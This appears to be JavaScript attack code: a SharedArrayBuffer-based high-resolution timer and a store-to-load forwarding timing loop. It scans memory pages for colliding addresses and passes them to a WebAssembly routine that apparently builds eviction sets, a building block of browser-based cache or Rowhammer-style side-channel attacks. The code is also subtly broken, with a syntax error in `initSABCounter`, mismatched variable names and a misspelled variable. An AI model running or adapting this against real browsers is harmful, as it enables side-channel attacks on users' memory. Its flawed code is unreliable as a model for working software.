<script type='text/javascript'>

function collidingAddressCheck(measurementArr, p, movingWindowSize) {      
    var movingWindowAverage = subArrayAverage(
      MeasurementArr, p - movingWindowSize - 1, movingWindowSize);
    
    if (MeasurementArr[p] < 100 && MeasurementArr[p-1] < 100 && 
      MeasurementArr[p] > movingWindowAverage + 5 &&
      MeasurementArr[p-1] > movingWindowAverage + 10 &&
      MeasurementArr[p-1] > MeasurementArr[p-2] + 10) {
       output += "? " + MeasurementArr[p];
      return true;
    }
    //output += " " + MeasurementArr[p];
    return false;
  }

function SABcounterWorker(){
    self.addEventListener('message', (m) => {
        // Create an Int32Array on top of that shared memory area
        const sharedArray = new Uint32Array(m.data)
      
        while (1) {
            //uncomment the following two lines to support firefox
            //if(sharedArray[0] > 2000000000)
            //   sharedArray[0] = 0;
      
            sharedArray[0]++;
        }
      });
}

function initSABCounter(){
    // Build a worker from an anonymous function body
    var blobURL = URL.createObjectURL( new Blob([ '(',
    function(){
    self.addEventListener('message', (m) => {
        // Create an Int32Array on top of that shared memory area
        const sharedArray = new Uint32Array(m.data)
        
        while (1) {
            //uncomment the following two lines to support firefox
            //if(sharedArray[0] > 2000000000)
            //   sharedArray[0] = 0;
        
            sharedArray[0]++;
        }
        });
    }.toString(),
    ')()' ], { type: 'application/javascript' } ) ),

    var SABcounterWorker  = new Worker( blobURL );
    SABcounter.postMessage(sharedBuffer);

    var SABCounterArray = new Uint32Array(sharedBuffer);
    //wait until counter counts
    while(SABCounterArray[0] == 0){}

    return SABcounter;
}

function storeForward(pageCount, rounds = 100, windowSize = 64){
    var sharedBuffer = new SharedArrayBuffer(Uint32Array.BYTES_PER_ELEMENT);
    var SABCounterArray = new Uint32Array(sharedBuffer);
    var SABcounterWorker = initSABCounter(sharedBuffer);

    var pageSize = 4096;
    var uint32Buffer = new Uint32Array(pageCount * (pageSize/4));
    var uint16MeasurementArr = new Uint16Array(pageCount);
    var detectionWindowSize = 10;
    var candidateIndex = 0;

    for (var p = windowSize; p < pageCount; p++) {
        var total = 0;

        for (var r = 0; r < rounds; r++) {
          // Stores
          for (var i = windowSize; i >= 0; i--) {
            uint32Buffer[(p - i) * 1024] = 0;
          }
          // Measuring load
          var before = SABCounterArray[0];

          var val = uint32Buffer[candidateIndex];
          //insert some useless commands to avoid instruction reordering
          //this seems to work, but there should exist better stuff
          val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;
          var after = val;

          after += SABCounterArray[0];
          total += (after - before) - val;
        }
        uint16MeasurementArr[p] = total / rounds;
    }
    var ouput = "";
    for(var p = windowSize; p < pageCount; p++) {
        output += uint16MeasurementArr[p] + " ";
    }

    //save some energy
    SABcounterWorker.terminate();
}
</script>


if (typeof mergeInto !== 'undefined')
  mergeInto(LibraryManager.library, {
    store_for_js: function(uint8ptrBuffer, bufferSize, uint8ptrAddressArr, addressArrSize, uint8ptrCandidate) {
      var rounds = 100;
      
      var pageCount = bufferSize / pageSize;
      var windowSize = 64;
      var movingWindowSize = 10;

      var uint32wasmMem = new Uint32Array(Module['wasmMemory'].buffer);
      var uint32ptrBuffer = uint8ptrBuffer / 4;
      var uint16MeasurementArr = new Uint16Array(pageCount);
      var uint32ptrAdressArr = uint8ptrAddressArr / 4;
      var uint32ptrCandidate = uint8ptrCandidate / 4;
      var lock = 0;
      var numberOfStoreForAdd = 0;

      var nextCollidingAdressOffset = 20;

      //var bufferedOutput = "";

      function subArrayAverage(arr, start, windowSize) {
        var sum = 0;
        for (var i = 0; i < windowSize; i++) {
          sum += arr[start + i];
        }
        return sum / windowSize;
      }

      var output = "";
      
      function checkForStoreFor(MeasurementArr, p, movingWindowSize) {      
        var movingWindowAverage = subArrayAverage(
          MeasurementArr, p - movingWindowSize - 1, movingWindowSize);
        
        if (MeasurementArr[p] < 100 && MeasurementArr[p-1] < 100 && 
          MeasurementArr[p] > movingWindowAverage + 5 &&
          MeasurementArr[p-1] > movingWindowAverage + 10 &&
          MeasurementArr[p-1] > MeasurementArr[p-2] + 10) {
           output += "? " + MeasurementArr[p];
          return true;
        }
        //output += " " + MeasurementArr[p];
        return false;
      }
      //var savedp = 0;

      console.log(uint8ptrBuffer);

      for (var p = windowSize; p < pageCount; p++) {
        var total = 0;

        for (var r = 0; r < rounds; r++) {
          // Stores
          for (var i = windowSize; i >= 0; i--) {
            uint32wasmMem[uint32ptrBuffer + (p - i) * 1024] = 0;
            // evictionBuffer[(p-i)*PAGE_SIZE] = 0;
          }
          // Measuring load
          var before = Module['sharedArrayCounter'][0];

          var val = uint32wasmMem[uint32ptrCandidate];
          //insert some useless commands to avoid instruction reordering
          //this seems to work quite well, but there should exists better stuff
          val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;
          var after = val;

          after += Module['sharedArrayCounter'][0];
          total += (after - before) - val;
        }
        uint16MeasurementArr[p] = total / rounds;

        // if(p % 1000 == 999){
        //   console.log(output);
        //   output = "";
        // }

        // check for new storefor address
        if (p > windowSize + movingWindowSize && lock < 0 &&
          checkForStoreFor(uint16MeasurementArr, p, movingWindowSize)) {
            //console.log((p-1) + ": " + ((p-1)-savedp));
            //bufferedOutput += ((p-1)-savedp) + " ";
            //savedp = p-1;
          var uint8ptrStoreForAdd = (uint8ptrBuffer + (p-1) * pageSize);
          uint32wasmMem[uint32ptrAdressArr + numberOfStoreForAdd] = uint8ptrStoreForAdd;
          numberOfStoreForAdd++;

          if(numberOfStoreForAdd >= 128){ //try to create es
            //console.log(bufferedOutput);
            if(Module['asm']._try_to_create_es(uint8ptrAddressArr, numberOfStoreForAdd) != 0){
              //console.log(output);
              return true;
            }
              
          }
          //size of AddressArr is limited
          if(numberOfStoreForAdd == addressArrSize){
            return false;
          }
          lock = 10;
        } else {
          output += " " + uint16MeasurementArr[p];
        }
        lock--;
      }
      console.log("end");


      // average = arr => arr.reduce((p, c) => p + c, 0) / arr.length;
      // var measurementAverage = average(measurementArr);
      // console.log('measurementAverage:' + measurementAverage);
      // console.log(output);
    }
  });